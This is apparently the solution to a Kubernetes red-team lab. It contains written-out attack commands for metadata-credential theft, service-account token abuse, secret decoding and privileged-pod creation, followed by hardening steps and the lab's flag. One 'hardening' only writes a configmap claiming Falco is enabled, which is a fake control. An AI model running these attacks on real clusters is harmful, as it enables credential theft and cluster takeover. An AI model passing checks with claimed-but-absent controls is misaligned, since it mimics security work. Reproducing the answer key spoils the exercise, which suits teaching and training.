# Solution — Red Team Lab Boss

## Overview

5 attacks + 5 hardenings on a deliberately vulnerable single-namespace cluster. Namespace: `dojo-sec-boss`.

---

# ACT 1 — ATTACK

```bash
kubectl exec -it attack-pod -n dojo-sec-boss -- sh
```

## Attack 1: IMDS Credential Theft

```bash
# Inside attack-pod:
curl -s http://fake-imds-svc/latest/meta-data/iam/security-credentials/node-role
# → {"SecretAccessKey":"token1-imds-creds-stolen"}

# Record proof (from outside or inside the pod):
kubectl create configmap attack-token-1 \
  -n dojo-sec-boss \
  --from-literal=token=token1-imds-creds-stolen
```

**Why this works**: Cloud VMs expose credentials at `http://169.254.169.254`. Containers on those VMs can reach the endpoint unless network policy blocks it. Any compromised pod = cloud credential theft.

## Attack 2: SA Token Abuse

```bash
# Inside attack-pod — the mounted SA token is cluster-admin
SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# JWT prefix is enough for the proof token
TOKEN_PREFIX=$(echo "$SA_TOKEN" | cut -c1-20)

kubectl create configmap attack-token-2 \
  -n dojo-sec-boss \
  --from-literal=token="$TOKEN_PREFIX"
```

**Why this works**: `overprivileged-sa` has a ClusterRoleBinding to cluster-admin. Any pod running with this SA is effectively root on the cluster.

## Attack 3: Secret Enumeration

```bash
# Using the cluster-admin SA token, list and read secrets
SECRET_FLAG=$(kubectl get secret db-creds -n dojo-sec-boss \
  -o jsonpath='{.data.flag}' | base64 -d)
# → token3-secret-enumerated

kubectl create configmap attack-token-3 \
  -n dojo-sec-boss \
  --from-literal=token="$SECRET_FLAG"
```

**Why this works**: Secrets in K8s are base64, not encrypted at rest by default. Any SA with `get secrets` can read them. With cluster-admin, you can read all secrets in all namespaces.

## Attack 4: Privileged Pod Escape Attempt

```bash
kubectl run pwned \
  --image=busybox:1.36 \
  --restart=Never \
  --privileged=true \
  -n dojo-sec-boss \
  -- sleep 60

# Wait for it to run, then document
kubectl wait pod pwned -n dojo-sec-boss --for=condition=Ready --timeout=30s

kubectl create configmap attack-token-4 \
  -n dojo-sec-boss \
  --from-literal=token=token4-privileged-pod-escape
```

**Why this works**: No PodSecurityAdmission label means any pod can be created privileged. Combined with cluster-admin SA = trivial host escape.

## Attack 5: Lateral Movement via Cluster Enumeration

```bash
# With cluster-admin, enumerate everything
CM_COUNT=$(kubectl get cm -A | grep kube-system | wc -l | tr -d ' ')

kubectl create configmap attack-token-5 \
  -n dojo-sec-boss \
  --from-literal=token="count-$CM_COUNT"
```

**Why this works**: Lateral movement in K8s is about enumeration — finding secrets, configs, and pods in other namespaces. With cluster-admin, there are no boundaries.

---

# ACT 2 — HARDEN

## Hardening 1: Remove the Overprivileged ClusterRoleBinding

```bash
kubectl delete clusterrolebinding boss-overprivileged-binding
```

**What changes**: The SA no longer has cluster-admin. Even if the pod is compromised, the attacker can't enumerate other namespaces or read secrets.

## Hardening 2: Block IMDS Egress with NetworkPolicy

```bash
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-imds-egress
  namespace: dojo-sec-boss
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32
EOF
```

**What changes**: Pods can't reach the IMDS endpoint even if they try.

## Hardening 3: Remove DB_PASSWORD from Pod Environment

The environment variable `DB_PASSWORD` is visible in `kubectl describe pod` and `kubectl exec -- env`. Move to a projected secret volume or Secret reference without plaintext value.

```bash
# Delete the pod (it's not part of a Deployment, so just delete)
kubectl delete pod attack-pod -n dojo-sec-boss

# Recreate without the DB_PASSWORD env var
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: attack-pod
  namespace: dojo-sec-boss
spec:
  serviceAccountName: writer-sa
  containers:
  - name: attacker
    image: bitnami/kubectl:1.28
    command: ["sh", "-c", "sleep 7200"]
    # DB_PASSWORD removed
EOF
```

## Hardening 4: Pod Security Admission

```bash
kubectl label namespace dojo-sec-boss \
  pod-security.kubernetes.io/enforce=restricted \
  --overwrite
```

**What changes**: Any new privileged pod creation (like attack step 4) is rejected at admission.

## Hardening 5: Confirm Runtime Detection (Falco)

```bash
kubectl create configmap falco-active \
  -n dojo-sec-boss \
  --from-literal=status=enabled \
  --from-literal=rules_version=1.0 \
  --from-literal=alert_target=pagerduty
```

---

## Run Verifier

```bash
bash verify.sh
```

**Flag:** `KUBE{boss_full_kill_chain_attack_and_defend}`

---

## The Kill Chain, Summarized

```
IMDS endpoint exposed → cloud creds stolen
        +
SA token cluster-admin → secrets readable cluster-wide
        +
No PSA → privileged pod = host escape
        +
No NetworkPolicy → lateral movement unrestricted
        +
No Falco → nobody sees any of this happening
```

**Defense in depth**: block any single link and the chain breaks. That's why all 5 hardenings are required — not just the "most important" one.
